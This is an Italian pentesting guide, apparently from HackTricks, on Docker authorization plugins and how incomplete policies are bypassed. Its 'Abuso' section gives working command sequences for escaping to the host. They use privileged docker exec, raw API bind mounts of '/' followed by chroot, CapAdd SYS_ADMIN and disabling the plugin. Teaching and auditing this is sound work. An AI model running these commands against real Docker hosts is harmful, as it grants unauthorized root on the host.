# Plugin di autorizzazione a runtime

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I plugin di autorizzazione a runtime sono uno strato di policy aggiuntivo che decide se un chiamante può eseguire una determinata azione sul daemon. Docker è l'esempio classico. Per default, chiunque possa comunicare con il Docker daemon ha di fatto ampio controllo su di esso. I plugin di autorizzazione cercano di restringere questo modello esaminando l'identità dell'utente autenticato e l'operazione API richiesta, quindi permettendo o negando la richiesta in base alla policy.

Questo argomento merita una pagina dedicata perché cambia il modello di sfruttamento quando un attacker ha già accesso a una Docker API o a un utente del gruppo `docker`. In tali ambienti la domanda non è più solo "can I reach the daemon?" ma anche "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Funzionamento

Quando una richiesta raggiunge il Docker daemon, il sottosistema di autorizzazione può passare il contesto della richiesta a uno o più plugin installati. Il plugin vede l'identità dell'utente autenticato, i dettagli della richiesta, header selezionati e parti del body della richiesta o della risposta quando il content type è adatto. Più plugin possono essere concatenati e l'accesso è concesso solo se tutti i plugin permettono la richiesta.

Questo modello sembra robusto, ma la sua sicurezza dipende interamente da quanto completamente l'autore della policy ha compreso l'API. Un plugin che blocca `docker run --privileged` ma ignora `docker exec`, trascura chiavi JSON alternative come il top-level `Binds`, o permette l'amministrazione dei plugin può creare un falso senso di restrizione lasciando comunque aperti percorsi diretti di privilege-escalation.

## Target comuni dei plugin

Aree importanti per la revisione della policy sono:

- endpoint di creazione dei container
- campi di `HostConfig` come `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, e opzioni di condivisione dei namespace
- comportamento di `docker exec`
- endpoint di gestione dei plugin
- qualsiasi endpoint che può indirettamente innescare azioni a runtime fuori dal modello di policy previsto

Storicamente, esempi come il plugin `authz` di Twistlock e plugin educativi semplici come `authobot` hanno reso questo modello facile da studiare perché i loro file di policy e i percorsi di codice mostravano come la mappatura da endpoint ad azione fosse effettivamente implementata. Nel lavoro di assessment, la lezione importante è che l'autore della policy deve comprendere l'intera superficie API anziché solo i comandi CLI più visibili.

## Abuso

Il primo obiettivo è capire cosa è effettivamente bloccato. Se il daemon nega un'azione, l'errore spesso leaks il nome del plugin, il che aiuta a identificare il controllo in uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se hai bisogno di un endpoint profiling più ampio, strumenti come `docker_auth_profiler` sono utili perché automatizzano il compito altrimenti ripetitivo di controllare quali rotte API e quali strutture JSON sono realmente permesse dal plugin.

Se l'ambiente usa un plugin personalizzato e puoi interagire con l'API, enumera quali campi degli oggetti sono realmente filtrati:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Questi controlli sono importanti perché molte mancanze nelle autorizzazioni sono specifiche di campo piuttosto che di concetto. Un plugin può rifiutare un pattern CLI senza bloccare completamente la struttura API equivalente.

### Esempio completo: `docker exec` aggiunge privilegi dopo la creazione del container

Una policy che blocca la creazione di container privilegiati ma permette la creazione di container non confinati più `docker exec` può comunque essere bypassata:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se il daemon accetta il secondo passaggio, l'utente ha ottenuto nuovamente un processo interattivo privilegiato all'interno di un container che l'autore della policy riteneva vincolato.

### Esempio completo: Bind Mount attraverso Raw API

Alcune policy difettose ispezionano solo una singola struttura JSON. Se il bind mount del root filesystem non viene bloccato in modo coerente, l'host può comunque essere montato:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La stessa idea può anche apparire sotto `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impatto è un completo escape del filesystem host. Il dettaglio interessante è che il bypass deriva da una copertura incompleta della policy piuttosto che da un kernel bug.

### Esempio completo: Unchecked Capability Attribute

Se la policy dimentica di filtrare un attributo relativo alle capability, l'attaccante può creare un container che recupera una capability pericolosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una volta che `CAP_SYS_ADMIN` o una capability altrettanto potente è presente, molte tecniche di breakout descritte in [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) diventano raggiungibili.

### Esempio completo: Disabilitare il Plugin

Se le operazioni di plugin-management sono consentite, il bypass più pulito potrebbe essere disattivare completamente il controllo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Questo è un fallimento della policy a livello di control-plane. Il livello di autorizzazione esiste, ma l'utente che doveva essere limitato mantiene ancora il permesso di disabilitarlo.

## Controlli

Questi comandi servono a identificare se esiste un livello di policy e se sembra essere completo o superficiale.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Cosa è interessante qui:

- I denial messages che includono il nome di un plugin confermano un authorization layer e spesso rivelano l'implementazione esatta.
- Una lista di plugin visibile all'attaccante può essere sufficiente per scoprire se sono possibili operazioni di disabilitazione o riconfigurazione.
- Una policy che blocca solo le azioni CLI ovvie ma non le richieste API raw dovrebbe essere considerata aggirabile fino a prova contraria.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Debolezze manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Non abilitato per impostazione predefinita | L'accesso al Daemon è di fatto tutto-o-nulla a meno che non sia configurato un authorization plugin | policy di plugin incomplete, blacklist invece di allowlist, consentire la gestione dei plugin, punti ciechi a livello di campo |
| Podman | Non è un equivalente diretto comune | Podman si basa tipicamente più su permessi Unix, esecuzione rootless e decisioni di esposizione dell'API che su authz plugins in stile Docker | esporre un Podman API rootful in modo ampio, permessi del socket deboli |
| containerd / CRI-O | Modello di controllo diverso | Questi runtime si basano generalmente sui permessi del socket, sui confini di trust del nodo e sui controlli dell'orchestrator a livelli superiori piuttosto che su Docker authz plugins | montare il socket nei workload, ipotesi di trust locale del nodo deboli |
| Kubernetes | Usa authn/authz a livello di API-server e kubelet, non Docker authz plugins | Cluster RBAC e admission controls sono il principale livello di policy | RBAC troppo permissivo, policy di admission deboli, esposizione diretta di kubelet o runtime APIs |
